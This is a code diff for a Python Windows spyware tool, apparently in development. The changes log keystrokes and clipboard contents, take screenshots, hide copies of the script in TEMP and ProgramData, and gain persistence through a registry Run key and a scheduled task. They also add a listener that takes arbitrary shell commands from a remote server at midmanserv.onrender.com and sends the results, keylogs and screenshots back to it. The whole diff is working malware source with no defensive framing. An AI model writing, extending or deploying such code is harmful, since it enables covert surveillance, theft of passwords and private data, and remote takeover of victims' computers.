@@ -1,35 +1,29 @@
 import ctypes
+import json
 import sys
 import threading
 import requests
 from threading import Lock,Timer
 import time
 import os
-from shutil import copy2
+from shutil import copy
 import winreg as reg
 from getpass import getuser
-from pynput.keyboard import Key, Listener
-import tokens
-from tkinter import Tk
+from pynput.keyboard import Listener
+from pyperclip import paste
 import pyautogui
-from pymongo import MongoClient
 import io
 import base64
+import subprocess
 
 ##
-u = getuser()
-path_l = os.path.expandvars(f'%TEMP%//{u}_system_meta.txt')
+user = getuser()
+path_l = os.path.expandvars(f'%TEMP%//{user}_system_meta.txt')
 path_e = os.path.expandvars(f'%TEMP%//AGDInvokerUtility.exe')
-webhook_url = tokens.webhook_url
-uri = tokens.mongo_uri
+path_e2 = os.path.expandvars(f'C:\ProgramData\WinMonitor.exe')
 file_lock = Lock()
 keystroke_buffer = []
-##
-
-# MongoDB Setup
-client = MongoClient(uri)
-db = client["Stealthpoint_DB"]
-collection = db["logs"]
+task_name = "WinMon"
 ##
 
 #identification
@@ -39,15 +33,31 @@ try:
 except:
     my_ip = "Unknown"
     pass
+midman = f"https://midmanserv.onrender.com/api/{my_ip}"
 
-#
-midman = f"http://127.0.0.1:5000/api/{my_ip}"
-#
-
+##
+def set_scheduler():
+    time.sleep(120)
+    try:
+        subprocess.run(f'schtasks /create /tn "{task_name}" /tr "{path_e2}" /sc onlogon /rl highest /f', shell=True, check=True,creationflags=0x08000000)
+    except Exception as e:
+        pass
+scheduler_thrd = threading.Thread(target=set_scheduler, daemon=True)
+scheduler_thrd.start()
+##
+try:
+    ctypes.windll.kernel32.SetFileAttributesW(path_e2, 128)
+    copy(current_file, path_e2)
+    attribute_set = ctypes.windll.kernel32.SetFileAttributesW(path_e2, 0x02)
+except Exception as e:
+    print(f"Error copying to ProgramData: {e}")
 #hide and add to startup with registry
 try:
-    copy2(current_file, path_e)
+    ctypes.windll.kernel32.SetFileAttributesW(path_e2, 128)
+    os.remove(path_e)
+    copy(current_file, path_e)
     attribute_set = ctypes.windll.kernel32.SetFileAttributesW(path_e, 0x02)
+    
 except:
     pass
 create_reg = reg.ConnectRegistry(None, reg.HKEY_CURRENT_USER)
@@ -56,6 +66,29 @@ try:
     reg.SetValueEx(open_key, 'AGDInvokerUtility', 0, reg.REG_SZ, path_e)
 except:
     pass
+##
+
+#
+def is_caps_lock():
+    return ctypes.windll.user32.GetKeyState(0x14) & 1
+#
+
+##
+def run_remote_command(command_string):
+    try:
+        output = subprocess.check_output(
+            command_string, 
+            shell=True, 
+            stderr=subprocess.STDOUT, 
+            stdin=subprocess.DEVNULL,
+            timeout=15 
+        )
+        return output.decode('utf-8', errors='replace')
+    except subprocess.CalledProcessError as e:
+        return e.output.decode('utf-8', errors='replace')
+    except Exception as e:
+        return f"System Error: {str(e)}"
+##
 
 #screenshot function
 def take_screenshot():
@@ -70,25 +103,51 @@ def take_screenshot():
         return None
 
 #Listen for ss commands from dashb
-def check_screenshot():
+def command_listener():
     while True:
+        print(f"Listening for commands at {midman}...")
         try:
-            response = requests.get(f"{midman}")
-            if response.status_code == 200:
-                data = response.json()
-                if data.get("command") == "screenshot":
-                    img_data = take_screenshot()
-                    if img_data:
-                        requests.post(f"{midman}/screenshot", json={"image": img_data})
+            response = requests.get(f"{midman}/{user}", stream=True)
+            for line in response.iter_lines():
+                print(f"Received line: {line}")  # Debug print to see raw lines
+                if line:
+                    decoded_line = line.decode('utf-8')
+                    if decoded_line.startswith("data: "):
+                        data_str = decoded_line[6:]
+                        try:
+                            data = json.loads(data_str)
+                            # print(f"Received command: {data}")
+                        except: 
+                            continue
+                        incoming_cmd = data.get("command", "")
+                        if incoming_cmd == "screenshot":
+                            img_data = take_screenshot()
+                            if img_data:
+                                requests.post(f"{midman}/screenshot", json={"image": img_data , "username": user , "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")})
+                        elif incoming_cmd:
+                            output = run_remote_command(incoming_cmd)
+                            result_payload = {
+                                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
+                                "username": user,
+                                "ip_address": my_ip,
+                                "response": f"> {incoming_cmd}\n{output}" 
+                            }
+                            requests.post(f"{midman}/output", json=result_payload)
+                        
+        except requests.exceptions.RequestException:
+            time.sleep(5)
         except Exception as e:
-            pass
-        time.sleep(15)
+            print(f"Error: {e}")
+            time.sleep(5)
 
 #listener code
 def on_key_press(key):
     global keystroke_buffer
     try:
-        k = key.char if key.char is not None else str(key)
+        if is_caps_lock():
+            k = key.char.upper() if key.char is not None else str(key)
+        else:
+            k = key.char if key.char is not None else str(key)
     except AttributeError:
         k = str(key)
     if k == "Key.backspace":
@@ -97,14 +156,9 @@ def on_key_press(key):
         keystroke_buffer.append(" ")
     elif k == "Key.enter": keystroke_buffer.append("<ENTER>")
     elif "Key." not in k: 
-        if ord(k) >= 32:
+        if ord(k) >= 32 and ord(k) <= 126:
             keystroke_buffer.append(k)
-
-    # if len(keystroke_buffer) >= 50:
-    #     data_to_save = "".join(keystroke_buffer)
-    #     keystroke_buffer = []
-    #     save_to_file(data_to_save)
-
+            print("Key pressed: ", k) #remove after testing
 
 #save logs as backup 
 def save_to_file(content):
@@ -115,94 +169,49 @@ def save_to_file(content):
                 f.flush()
         except Exception as e:
             pass
-        
 
-
-#log cleaner function
-# def writetofile(key):
-#     keydata = str(key)
-#     keydata = keydata.replace("'", "")
-#     if keydata == "Key.space":
-#         keydata = " "
-#     if keydata == "Key.cmd":
-#         keydata = "-WIN-"
-#     if keydata == "Key.shift" or keydata == "Key.shift_r":
-#         keydata = ""
-#     if keydata == "Key.backspace":
-#         keydata = "-BACK-"
-#     if keydata == "Key.alt_l" or keydata == "Key.alt_r":
-#         keydata = "-ALT-"
-#     if keydata == "Key.tab":
-#         keydata = "-TAB-"
-#     if keydata == "Key.ctrl_l" or keydata == "Key.ctrl_r":
-#         keydata = "-CTRL-"
-#     with file_lock:
-#         try:
-#             with open(path_l, "a") as f:
-#                 f.write(keydata)
-#         except:
-#             pass
-#     ctypes.windll.kernel32.SetFileAttributesW(path_l, 0x02)
-
-#sending logfile to discord(testing/closed)
-# def send_logfile(): 
-
-#     with open(path_l, "rb") as f:
-#         files = {"file": (path_l, f)}
-#         attribute_set = ctypes.windll.kernel32.SetFileAttributesW(path_l, 0x02)
-#     try:
-#             response = requests.post(webhook_url, files=files)
-#             print(response.status_code)
-#     except:
-#         pass
-#     #schedule next send in 1 minute
-#     threading.Timer(60, send_logfile).start()
-#     file_stat = os.stat(path_l)
-#     if file_stat.st_size > 7000000:
-#         with open(path_l, "w") as f:
-#             f.write("")
-#time interval between sending logs
-#threading.Timer(60, send_logfile).start()
-
-#send logs to mongodb
-def send_to_mongodb():
+#send logs to server
+def send_logs_to_server():
     global keystroke_buffer
-    if keystroke_buffer:
-        with file_lock:
+    data_to_send = ""
+    with file_lock:
+        if keystroke_buffer:
             data_to_send = "".join(keystroke_buffer)
+            print("Data to send: ", data_to_send) #remove after testing
             keystroke_buffer = []
         try:
-            r = Tk()
-            result = r.selection_get(selection='CLIPBOARD')
+            cptext = paste()
+            result = cptext 
+            if cptext:
+                result = cptext[:1000]
         except:
-            result = "No clipboard data"
-
+            result = "Clipboard access error"
     try:
         if data_to_send:
-            # Push to MongoDB
+            # Push to server
             if data_to_send.strip():
                 log_entry = {
                 "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
-                "username": u,
+                "username": user,
                 "ip_address": my_ip,
                 "payload": data_to_send,
                 "clipboard": result
                 }
-                collection.insert_one(log_entry)
+                requests.post(f"{midman}/logs", json=log_entry)
                 save_to_file(data_to_send)
-                r.destroy()
 
     except Exception as e:
-        # print(f"Error sending to MongoDB: {e}") #remove after testing
+        print(f"Error sending to server: {e}") #remove after testing
         pass
+
 # schedule next sync in 60 seconds
-    Timer(60, send_to_mongodb).start()
+    Timer(60, send_logs_to_server).start()
     
-cmd_thread = threading.Thread(target=check_screenshot, daemon=True)
+cmd_thread = threading.Thread(target=command_listener, daemon=True)
 cmd_thread.start()
 
 #start loop
-send_to_mongodb()
+send_logs_to_server()
 
 #start listening to keyboard
 with Listener(on_press=on_key_press) as l:
